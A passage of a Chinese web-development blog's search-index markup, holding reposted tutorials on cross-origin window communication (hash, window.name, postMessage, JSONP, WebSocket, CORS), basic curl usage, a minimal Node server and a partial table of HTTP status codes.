&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;window.parent.document.body
// 报错
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的&lt;code&gt;document.domain&lt;/code&gt;属性，就可以规避同源政策，拿到DOM。&lt;/p&gt;
&lt;p&gt;对于完全不同源的网站，目前有三种方法，可以解决跨域窗口的通信问题。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;片段识别符（fragment identifier）&lt;/li&gt;
&lt;li&gt;window.name&lt;/li&gt;
&lt;li&gt;跨文档通信API（Cross-document messaging）&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;31-片段识别符&#34;&gt;3.1 片段识别符&lt;/h3&gt;
&lt;p&gt;片段标识符（fragment identifier）指的是，URL的&lt;code&gt;#&lt;/code&gt;号后面的部分，比如&lt;code&gt;http://example.com/x.html#fragment&lt;/code&gt;的&lt;code&gt;#fragment&lt;/code&gt;。如果只是改变片段标识符，页面不会重新刷新。&lt;/p&gt;
&lt;p&gt;父窗口可以把信息，写入子窗口的片段标识符。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var src = originURL + &#39;#&#39; + data;
document.getElementById(&#39;myIFrame&#39;).src = src;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;子窗口通过监听&lt;code&gt;hashchange&lt;/code&gt;事件得到通知。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;window.onhashchange = checkMessage;

function checkMessage() {
  var message = window.location.hash;
  // ...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;同样的，子窗口也可以改变父窗口的片段标识符。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;parent.location.href= target + &amp;quot;#&amp;quot; + hash;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;32-windowname&#34;&gt;3.2 window.name&lt;/h3&gt;
&lt;p&gt;浏览器窗口有&lt;code&gt;window.name&lt;/code&gt;属性。这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。&lt;/p&gt;
&lt;p&gt;父窗口先打开一个子窗口，载入一个不同源的网页，该网页将信息写入&lt;code&gt;window.name&lt;/code&gt;属性。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;window.name = data;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;接着，子窗口跳回一个与主窗口同域的网址。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;location = &#39;http://parent.url.com/xxx.html&#39;;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;然后，主窗口就可以读取子窗口的&lt;code&gt;window.name&lt;/code&gt;了。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var data = document.getElementById(&#39;myFrame&#39;).contentWindow.name;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;这种方法的优点是，&lt;code&gt;window.name&lt;/code&gt;容量很大，可以放置非常长的字符串；缺点是必须监听子窗口&lt;code&gt;window.name&lt;/code&gt;属性的变化，影响网页性能。&lt;/p&gt;
&lt;h3 id=&#34;33-windowpostmessage&#34;&gt;3.3 window.postMessage&lt;/h3&gt;
&lt;p&gt;上面两种方法都属于破解，HTML5为了解决这个问题，引入了一个全新的API：跨文档通信 API（Cross-document messaging）。&lt;/p&gt;
&lt;p&gt;这个API为&lt;code&gt;window&lt;/code&gt;对象新增了一个&lt;code&gt;window.postMessage&lt;/code&gt;方法，允许跨窗口通信，不论这两个窗口是否同源。&lt;/p&gt;
&lt;p&gt;举例来说，父窗口&lt;code&gt;http://aaa.com&lt;/code&gt;向子窗口&lt;code&gt;http://bbb.com&lt;/code&gt;发消息，调用&lt;code&gt;postMessage&lt;/code&gt;方法就可以了。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var popup = window.open(&#39;http://bbb.com&#39;, &#39;title&#39;);
popup.postMessage(&#39;Hello World!&#39;, &#39;http://bbb.com&#39;);
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;postMessage&lt;/code&gt;方法的第一个参数是具体的信息内容，第二个参数是接收消息的窗口的源（origin），即&amp;quot;协议 + 域名 + 端口&amp;quot;。也可以设为&lt;code&gt;*&lt;/code&gt;，表示不限制域名，向所有窗口发送。&lt;/p&gt;
&lt;p&gt;子窗口向父窗口发送消息的写法类似。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;window.opener.postMessage(&#39;Nice to see you&#39;, &#39;http://aaa.com&#39;);
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;父窗口和子窗口都可以通过&lt;code&gt;message&lt;/code&gt;事件，监听对方的消息。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;window.addEventListener(&#39;message&#39;, function(e) {
  console.log(e.data);
},false);
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;message&lt;/code&gt;事件的事件对象&lt;code&gt;event&lt;/code&gt;，提供以下三个属性。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;event.source&lt;/code&gt;：发送消息的窗口&lt;/li&gt;
&lt;li&gt;&lt;code&gt;event.origin&lt;/code&gt;: 消息发向的网址&lt;/li&gt;
&lt;li&gt;&lt;code&gt;event.data&lt;/code&gt;: 消息内容&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;下面的例子是，子窗口通过&lt;code&gt;event.source&lt;/code&gt;属性引用父窗口，然后发送消息。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;window.addEventListener(&#39;message&#39;, receiveMessage);
function receiveMessage(event) {
  event.source.postMessage(&#39;Nice to see you!&#39;, &#39;*&#39;);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;event.origin&lt;/code&gt;属性可以过滤不是发给本窗口的消息。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;window.addEventListener(&#39;message&#39;, receiveMessage);
function receiveMessage(event) {
  if (event.origin !== &#39;http://aaa.com&#39;) return;
  if (event.data === &#39;Hello World&#39;) {
      event.source.postMessage(&#39;Hello&#39;, event.origin);
  } else {
    console.log(event.data);
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;34-localstorage&#34;&gt;3.4 LocalStorage&lt;/h3&gt;
&lt;p&gt;通过&lt;code&gt;window.postMessage&lt;/code&gt;，读写其他窗口的 LocalStorage 也成为了可能。&lt;/p&gt;
&lt;p&gt;下面是一个例子，主窗口写入iframe子窗口的&lt;code&gt;localStorage&lt;/code&gt;。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;window.onmessage = function(e) {
  if (e.origin !== &#39;http://bbb.com&#39;) {
    return;
  }
  var payload = JSON.parse(e.data);
  localStorage.setItem(payload.key, JSON.stringify(payload.data));
};
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;上面代码中，子窗口将父窗口发来的消息，写入自己的LocalStorage。&lt;/p&gt;
&lt;p&gt;父窗口发送消息的代码如下。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var win = document.getElementsByTagName(&#39;iframe&#39;)[0].contentWindow;
var obj = { name: &#39;Jack&#39; };
win.postMessage(JSON.stringify({key: &#39;storage&#39;, data: obj}), &#39;http://bbb.com&#39;);
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;加强版的子窗口接收消息的代码如下。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;window.onmessage = function(e) {
  if (e.origin !== &#39;http://bbb.com&#39;) return;
  var payload = JSON.parse(e.data);
  switch (payload.method) {
    case &#39;set&#39;:
      localStorage.setItem(payload.key, JSON.stringify(payload.data));
      break;
    case &#39;get&#39;:
      var parent = window.parent;
      var data = localStorage.getItem(payload.key);
      parent.postMessage(data, &#39;http://aaa.com&#39;);
      break;
    case &#39;remove&#39;:
      localStorage.removeItem(payload.key);
      break;
  }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;加强版的父窗口发送消息代码如下。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var win = document.getElementsByTagName(&#39;iframe&#39;)[0].contentWindow;
var obj = { name: &#39;Jack&#39; };
// 存入对象
win.postMessage(JSON.stringify({key: &#39;storage&#39;, method: &#39;set&#39;, data: obj}), &#39;http://bbb.com&#39;);
// 读取对象
win.postMessage(JSON.stringify({key: &#39;storage&#39;, method: &amp;quot;get&amp;quot;}), &amp;quot;*&amp;quot;);
window.onmessage = function(e) {
  if (e.origin != &#39;http://aaa.com&#39;) return;
  // &amp;quot;Jack&amp;quot;
  console.log(JSON.parse(e.data).name);
};
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;四-ajax&#34;&gt;四、AJAX&lt;/h2&gt;
&lt;p&gt;同源政策规定，AJAX请求只能发给同源的网址，否则就报错。&lt;/p&gt;
&lt;p&gt;除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;JSONP&lt;/li&gt;
&lt;li&gt;WebSocket&lt;/li&gt;
&lt;li&gt;CORS&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;41-jsonp&#34;&gt;4.1 JSONP&lt;/h3&gt;
&lt;p&gt;JSONP是服务器与客户端跨源通信的常用方法。最大特点就是简单适用，老式浏览器全部支持，服务器改造非常小。&lt;/p&gt;
&lt;p&gt;它的基本思想是，网页通过添加一个&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;元素，向服务器请求JSON数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。&lt;/p&gt;
&lt;p&gt;首先，网页动态插入&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;元素，由它向跨源网址发出请求。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function addScriptTag(src) {
  var script = document.createElement(&#39;script&#39;);
  script.setAttribute(&amp;quot;type&amp;quot;,&amp;quot;text/javascript&amp;quot;);
  script.src = src;
  document.body.appendChild(script);
}

window.onload = function () {
  addScriptTag(&#39;http://example.com/ip?callback=foo&#39;);
}

function foo(data) {
  console.log(&#39;Your public IP address is: &#39; + data.ip);
};
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;上面代码通过动态添加&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;元素，向服务器&lt;code&gt;example.com&lt;/code&gt;发出请求。注意，该请求的查询字符串有一个&lt;code&gt;callback&lt;/code&gt;参数，用来指定回调函数的名字，这对于JSONP是必需的。&lt;/p&gt;
&lt;p&gt;服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;foo({
  &amp;quot;ip&amp;quot;: &amp;quot;8.8.8.8&amp;quot;
});
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;由于&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了&lt;code&gt;foo&lt;/code&gt;函数，该函数就会立即调用。作为参数的JSON数据被视为JavaScript对象，而不是字符串，因此避免了使用&lt;code&gt;JSON.parse&lt;/code&gt;的步骤。&lt;/p&gt;
&lt;h3 id=&#34;42-websocket&#34;&gt;4.2 WebSocket&lt;/h3&gt;
&lt;p&gt;WebSocket是一种通信协议，使用&lt;code&gt;ws://&lt;/code&gt;（非加密）和&lt;code&gt;wss://&lt;/code&gt;（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。&lt;/p&gt;
&lt;p&gt;下面是一个例子，浏览器发出的WebSocket请求的头信息（摘自&lt;a href=&#34;https://en.wikipedia.org/wiki/WebSocket&#34;&gt;维基百科&lt;/a&gt;）。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
Sec-WebSocket-Protocol: chat, superchat
Sec-WebSocket-Version: 13
Origin: http://example.com
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;上面代码中，有一个字段是&lt;code&gt;Origin&lt;/code&gt;，表示该请求的请求源（origin），即发自哪个域名。&lt;/p&gt;
&lt;p&gt;正是因为有了&lt;code&gt;Origin&lt;/code&gt;这个字段，所以WebSocket才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
Sec-WebSocket-Protocol: chat
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;43-cors&#34;&gt;4.3 CORS&lt;/h3&gt;
&lt;p&gt;CORS是跨源资源分享（Cross-Origin Resource Sharing）的缩写。它是W3C标准，是跨源AJAX请求的根本解决方法。相比JSONP只能发&lt;code&gt;GET&lt;/code&gt;请求，CORS允许任何类型的请求。&lt;/p&gt;
&lt;h2 id=&#34;转载&#34;&gt;转载&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;阮一峰&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html&#34;&gt;https://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
">58-http-11-浏览器同源政策及其规避方法</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-curl-ming-ling-xing/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://curl.haxx.se/&#34;&gt;curl&lt;/a&gt;是一种命令行工具，作用是发出网络请求，然后得到和提取数据，显示在&amp;quot;标准输出&amp;quot;（stdout）上面。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一、查看网页源码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;直接在curl命令后加上网址，就可以看到网页源码。我们以网址baidu.com为例（选择该网址，主要因为它的网页代码较短）：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;curl baidu.com
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
&amp;lt;meta http-equiv=&amp;quot;refresh&amp;quot; content=&amp;quot;0;url=http://www.baidu.com/&amp;quot;&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;页面会重定向到百度&lt;/p&gt;
&lt;p&gt;如果要把这个网页保存下来，可以使用&lt;code&gt;-o&lt;/code&gt;参数，这就相当于使用wget命令了。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;curl -o [文件名] baidu.com
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;curl -o baudu.html baidu.com
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;二、显示头信息&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-i&lt;/code&gt;参数可以显示http response的头信息，连同网页代码一起。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-I&lt;/code&gt;参数则是只显示http response的头信息。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;curl -i baidu.com
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;HTTP/1.1 200 OK                                                   
Date: Sun, 06 Jun 2021 08:49:54 GMT                               
Server: Apache                                                    
Last-Modified: Tue, 12 Jan 2010 13:48:00 GMT                      
ETag: &amp;quot;51-47cf7e6ee8400&amp;quot;                                          
Accept-Ranges: bytes                                              
Content-Length: 81                                                
Cache-Control: max-age=86400                                      
Expires: Mon, 07 Jun 2021 08:49:54 GMT                            
Connection: Keep-Alive                                            
Content-Type: text/html                                           
                                                                  
&amp;lt;html&amp;gt;                                                            
&amp;lt;meta http-equiv=&amp;quot;refresh&amp;quot; content=&amp;quot;0;url=http://www.baidu.com/&amp;quot;&amp;gt; 
&amp;lt;/html&amp;gt;                                                           
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;三、显示通信过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-v&lt;/code&gt;参数可以显示一次http通信的整个过程，包括端口连接和http request头信息。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;curl -v baidu.com
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;* Rebuilt URL to: baidu.com/
*   Trying 220.181.38.148...
* TCP_NODELAY set
* Connected to baidu.com (220.181.38.148) port 80 (#0)
&amp;gt; GET / HTTP/1.1
&amp;gt; Host: baidu.com
&amp;gt; User-Agent: curl/7.55.1
&amp;gt; Accept: */*
&amp;gt;
&amp;lt; HTTP/1.1 200 OK
&amp;lt; Date: Sun, 06 Jun 2021 08:53:20 GMT
&amp;lt; Server: Apache
&amp;lt; Last-Modified: Tue, 12 Jan 2010 13:48:00 GMT
&amp;lt; ETag: &amp;quot;51-47cf7e6ee8400&amp;quot;
&amp;lt; Accept-Ranges: bytes
&amp;lt; Content-Length: 81
&amp;lt; Cache-Control: max-age=86400
&amp;lt; Expires: Mon, 07 Jun 2021 08:53:20 GMT
&amp;lt; Connection: Keep-Alive
&amp;lt; Content-Type: text/html
&amp;lt;
&amp;lt;html&amp;gt;
&amp;lt;meta http-equiv=&amp;quot;refresh&amp;quot; content=&amp;quot;0;url=http://www.baidu.com/&amp;quot;&amp;gt;
&amp;lt;/html&amp;gt;
* Connection #0 to host baidu.com left intact
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果你觉得上面的信息还不够，那么下面的命令可以查看更详细的通信过程。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;curl --trace output.txt baidu.com
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;curl --trace-ascii output.txt baidu.com
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;推荐阅读&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;阮一峰&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.ruanyifeng.com/blog/2019/09/curl-reference.html&#34;&gt;http://www.ruanyifeng.com/blog/2019/09/curl-reference.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
">57-http-10-curl命令行</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-shi-yong-node-chuang-jian-yi-ge-jian-dan-de-web-fu-wu/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;电脑上安装好node,新建server.js文件，使用&lt;code&gt;node server.js&lt;/code&gt;运行该文件。&lt;/p&gt;
&lt;h2 id=&#34;代码&#34;&gt;代码&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const http = require(&#39;http&#39;)

http.createServer(function (request, response) {
    console.log(&#39;request come&#39;, request.url)

    response.end(&#39;123&#39;)
}).listen(8888)

console.log(&#39;server listening on 8888&#39;)
&lt;/code&gt;&lt;/pre&gt;
">56-http-9-使用node创建web服务</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-zhuang-tai-ma/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;当浏览者访问一个网页时，浏览者的浏览器会向网页所在服务器发出请求。当浏览器接收并显示网页前，此网页所在的服务器会返回一个包含HTTP状态码的信息头（server header）用以响应浏览器的请求。&lt;/p&gt;
&lt;p&gt;HTTP状态码的英文为HTTP Status Code。&lt;/p&gt;
&lt;p&gt;下面是常见的HTTP状态码：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;200 - 请求成功&lt;/li&gt;
&lt;li&gt;301 - 资源（网页等）被永久转移到其它URL&lt;/li&gt;
&lt;li&gt;404 - 请求的资源（网页等）不存在&lt;/li&gt;
&lt;li&gt;500 - 内部服务器错误&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;http状态码分类&#34;&gt;HTTP状态码分类&lt;/h2&gt;
&lt;p&gt;HTTP状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型，后两个数字没有分类的作用。HTTP状态码共分为5种类型：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;分类&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;分类描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;1**&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;信息，服务器收到请求，需要请求者继续执行操作&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;2**&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;成功，操作被成功接收并处理&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;3**&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;重定向，需要进一步的操作以完成请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;4**&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;客户端错误，请求包含语法错误或无法完成请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;5**&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;服务器错误，服务器在处理请求的过程中发生了错误&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;HTTP状态码列表:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;状态码&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;状态码英文名称&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;中文描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;100&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Continue&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;继续。客户端应继续其请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;101&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Switching Protocols&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;200&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;OK&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;请求成功。一般用于GET与POST请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;201&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Created&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;已创建。成功请求并创建了新的资源&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;202&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Accepted&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;已接受。已经接受请求，但未处理完成&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;203&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Non-Authoritative Information&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;204&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;No Content&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;205&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Reset Content&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;206&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Partial Content&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;部分内容。服务器成功处理了部分GET请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;300&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Multiple Choices&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;301&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Moved Permanently&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;302&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Found&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;303&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;See Other&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;查看其它地址。与301类似。使用GET和POST请求查看&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;304&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Not Modified&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;305&lt;/td&gt;
